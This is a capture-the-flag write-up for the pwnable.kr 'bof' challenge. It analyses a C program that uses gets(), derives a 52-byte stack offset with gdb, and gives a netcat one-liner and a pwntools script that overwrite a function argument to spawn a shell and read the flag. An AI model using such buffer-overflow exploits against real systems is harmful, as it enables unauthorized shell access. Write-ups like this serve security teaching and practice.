# bof Writeup

## Challenge infos

```text
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```

## Server content

```text
$ wget http://pwnable.kr/bin/bof
--2019-04-11 09:17:40--  http://pwnable.kr/bin/bof
Resolving pwnable.kr (pwnable.kr)... 143.248.249.64
Connecting to pwnable.kr (pwnable.kr)|143.248.249.64|:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://pwnable.kr/bin/bof [following]
--2019-04-11 09:17:40--  https://pwnable.kr/bin/bof
Connecting to pwnable.kr (pwnable.kr)|143.248.249.64|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7348 (7.2K)
Saving to: ‘bof’

bof                                  100%[======================================================================>]   7.18K  --.-KB/s    in 0.001s

2019-04-11 09:17:42 (12.9 MB/s) - ‘bof’ saved [7348/7348]

$ wget http://pwnable.kr/bin/bof.c
--2019-04-11 09:17:45--  http://pwnable.kr/bin/bof.c
Resolving pwnable.kr (pwnable.kr)... 143.248.249.64
Connecting to pwnable.kr (pwnable.kr)|143.248.249.64|:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://pwnable.kr/bin/bof.c [following]
--2019-04-11 09:17:46--  https://pwnable.kr/bin/bof.c
Connecting to pwnable.kr (pwnable.kr)|143.248.249.64|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 308 [text/x-csrc]
Saving to: ‘bof.c’

bof.c                                100%[======================================================================>]     308  --.-KB/s    in 0s

2019-04-11 09:17:47 (24.6 MB/s) - ‘bof.c’ saved [308/308]

$ file ./bof
./bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
$ cat bof.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}

$
```
## Exploitation objective
* We need to get shell on the netcat server ```nc pwnable.kr 9000``` running the ```bof``` executable

The ```bof``` executable is certainly compiled from the ```bof.c``` source code, let's have a look.

## C code analysis
```c
        char overflowme[32];
        printf("overflow me : ");
```

* Strong hints (with the name of the challenge) that we need to overflow the buffer ```overflowme```


```c
        gets(overflowme);       // smash me!
```

* Another strong hint in comment, note that the ```gets()``` function never checks the size of the input, we can write as many bytes as we want (and certainly more than the 32 allocated for the buffer) into ```overflowme```

```c
        if(key == 0xcafebabe){
                system("/bin/sh");
```

* We need to set the ```key``` argument to ```0xcafebabe``` to get to the shell ```system("/bin/sh")```, this is our target

```c
        func(0xdeadbeef);
```

* The ```func``` function is called with the ```key``` ```0xdeadbeef```, in a normal execution this will never be equal to ```0xcafebabe``` and the shell will never be reachable

## Buffer overflow and stack pointers during execution

* Let's run ```gdb``` with the local ```bof``` and disassemble the ```func``` function
```text
$ gdb ./bof
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./bof...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break func
Breakpoint 1 at 0x632
(gdb) run
Starting program: ./bof

Breakpoint 1, 0x56555632 in func ()
(gdb) disassemble func
Dump of assembler code for function func:
   0x5655562c <+0>:     push   ebp
   0x5655562d <+1>:     mov    ebp,esp
   0x5655562f <+3>:     sub    esp,0x48
=> 0x56555632 <+6>:     mov    eax,gs:0x14
   0x56555638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <+15>:    xor    eax,eax
   0x5655563d <+17>:    mov    DWORD PTR [esp],0x5655578c
   0x56555644 <+24>:    call   0xf7e73140 <puts>
   0x56555649 <+29>:    lea    eax,[ebp-0x2c]
   0x5655564c <+32>:    mov    DWORD PTR [esp],eax
   0x5655564f <+35>:    call   0xf7e72890 <gets>
   0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    mov    DWORD PTR [esp],0x5655579b
   0x56555664 <+56>:    call   0xf7e4e940 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    mov    DWORD PTR [esp],0x565557a3
   0x56555672 <+70>:    call   0xf7e73140 <puts>
   0x56555677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x5655567a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7f097b0 <__stack_chk_fail>
   0x56555688 <+92>:    leave
   0x56555689 <+93>:    ret
End of assembler dump.
(gdb)
```
We can see two interesting assembly segments :
```text
   0x56555649 <+29>:    lea    eax,[ebp-0x2c]
   0x5655564c <+32>:    mov    DWORD PTR [esp],eax
   0x5655564f <+35>:    call   0xf7e72890 <gets>
```
* The register ```eax``` is set to the address ```ebp-0x2c``` and then this address is pushed to the stack before the call to ```gets(overflowme)``` => This is the address of the ```overflowme``` buffer
```text
   0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
```
* The value at the address ```ebp+0x8``` is compared with the ```0xcafebabe``` constant, this correspond to the value we need to overwrite

If ```overflowme``` is ```ebp-0x2c```, this means ```overflowme[0]``` is ```[ebp-0x2c]``` and ```overflowme[n]``` is ```[ebp-0x2c+n]```

We need to overwrite the stack value at ```[ebp+0x8]```, so we need to solve ```ebp-0x2c+n == ebp+0x8 <=> n == 0x8+0x2c <=> n == 0x34 <=> n == 52```

* If we set the 4 bytes starting at overflowme[52] to be 0xcafebabe ('\xbe\xba\xfe\xca' in Little Endian) we can overwrite the key and pass the check

* NB : The following lines set up and check the health of a [stack canary](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries) at stack address ```[ebp-0xc]```, a random value set at the beginning of the function and to be checked at the end before the return to avoid being able to change the return address of the function. If we put random data in the buffer (and we do since ```[ebp-0xc]``` is lower than ```[ebp+0x8]```), the canary will be killed and the func function won't be able to return to main, fortunately we call shell before the canary is checked.
```text
=> 0x56555632 <+6>:     mov    eax,gs:0x14
   0x56555638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
```
```text
   0x56555677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x5655567a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7f097b0 <__stack_chk_fail>
```
## Exploitation

* We simply need to pass the computed ```overflowme``` on ```stdin``` after connecting to the server

* NB : If we simply send the string and close the ```stdin``` stream, the shell will directly exit, ```fun``` will try to return to ```main``` and since we killed the stack canary it will terminate with ```*** stack smashing detected ***``` error

* We can use ```cat``` to keep ```stdin``` open and send commands to the shell

* The exploits become ```(python -c "print('A'*52 + '\xbe\xba\xfe\xca')" ; cat) | nc pwnable.kr 9000```

* The check is then passed and the shell is given :

```text
$ cat flag
```

* ```PWN```

## Exploitation script

```python
#!/usr/bin/env python
from pwn import *
```
* Use [pwntools](https://github.com/Gallopsled/pwntools) for automatic exploitation
```python
target_key = 0xcafebabe

payload = fit({52:target_key})
```
* The target ```key``` is ```0xcafebabe```
* The offset to the ```key``` argument from the ```overflowme``` buffer is 52 as seen from ```gdb```
* [```fit()```](http://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.fit) is used to create a string with filler data and the data we need offset to the needed position, it automagically uses packing on the numbers we send to it
```python
# io = process('./bof')
io = remote('pwnable.kr', 9000)
```
* During testing the ```io``` is set to the local ```./bof``` executable downloaded by the setup script
* After the exploit is working we can use it on the server by netcat-ing to it with ```remote()```
```python
io.sendline(payload)
```
* Send the computed ```payload``` to get the shell
```python
io.sendline('cat flag')

io.sendline('exit')
```
* Send ```cat flag``` to get the ```flag``` file on the server and then exit the shell
```python

result = io.recvall()

io.close()

print(result)
```
* Print the ```result``` which is the ```flag```
* ```PWN```
